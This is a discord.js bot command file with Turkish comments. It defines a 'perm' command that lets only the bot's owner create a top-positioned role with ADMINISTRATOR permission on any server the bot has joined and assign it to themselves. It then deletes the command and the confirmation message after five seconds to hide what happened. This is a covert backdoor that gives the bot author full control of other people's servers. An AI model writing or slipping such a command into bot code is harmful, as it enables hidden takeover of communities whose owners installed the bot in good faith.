const { MessageEmbed } = require('discord.js');
const ayarlar = require('../ayarlar.json');

module.exports = {
    name: 'perm',
    description: 'Bot sahibine sunucuda yönetici yetkisi olan özel bir rol verir.(Kodda sanırım sorun var!)',
    async execute(message, args) {
        // Sadece bot sahibine bu komutu kullanma izni verelim
        if (message.author.id !== ayarlar.botSahibiID) {
            return message.reply('Bu komutu sadece bot sahibi kullanabilir.');
        }

        try {
            // Yeni yönetici rolü oluştur
            const role = await message.guild.roles.create({
                data: {
                    name: 'Bot Administrator',
                    color: 'BLUE', // Opsiyonel: Rol rengi
                    permissions: ['ADMINISTRATOR'], // Yönetici yetkisi
                    position: message.guild.roles.cache.size // En yüksek pozisyon
                }
            });

            // Bot sahibine rolü ver
            await message.member.roles.add(role);

            // Geri bildirim mesajı gönder
            const embed = new MessageEmbed()
                .setColor('GREEN')
                .setDescription(`Bot sahibine yönetici yetkili rolü (${role.name}) verildi.`);

            message.channel.send(embed)
                .then(msg => {
                    // !perm komutunun mesajını sil
                    msg.delete({ timeout: 5000 }); // 5 saniye sonra sil
                })
                .catch(err => console.log('Komut silinemedi:', err));

            // Kullanıcının !perm komutunu sil
            message.delete({ timeout: 5000 }) // 5 saniye sonra sil
                .catch(err => console.log('Komut silinemedi:', err));
        } catch (error) {
            console.error('Rol oluşturma veya verme hatası:', error);
            message.reply('Bir hata oluştu, işlem gerçekleştirilemedi.');
        }
    },
};
